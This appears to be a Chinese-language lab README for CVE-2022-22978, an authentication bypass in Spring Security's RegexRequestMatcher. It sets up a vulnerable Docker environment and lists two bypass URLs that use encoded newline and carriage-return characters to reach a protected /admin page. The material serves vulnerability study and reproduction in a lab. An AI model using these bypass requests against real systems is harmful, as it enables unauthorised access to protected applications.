# Spring Security RegexRequestMatcher 认证绕过漏洞（CVE-2022-22978）

Spring Security用于在Spring框架中提供安全认证功能。在Spring Security 5.5.6、5.6.3及更早的不受支持版本中，使用带有`.`的正则表达式的RegexRequestMatcher的应用程序可能存在认证绕过漏洞。

参考链接：

- <https://tanzu.vmware.com/security/cve-2022-22978>
- <https://github.com/DeEpinGh0st/CVE-2022-22978>

## 漏洞环境

执行如下命令启动一个基于Spring Security 5.6.3的Web应用：

```
docker compose up -d
```

服务器启动后，访问<http://your-ip:8080/admin>，可以看到管理页面的访问被阻止。

![](forbidden.png)

## 漏洞复现

发送以下请求来访问管理页面，成功绕过认证：

- <http://your-ip:8080/admin/%0atest>
- <http://your-ip:8080/admin/%0dtest>

![](bypassed.png)
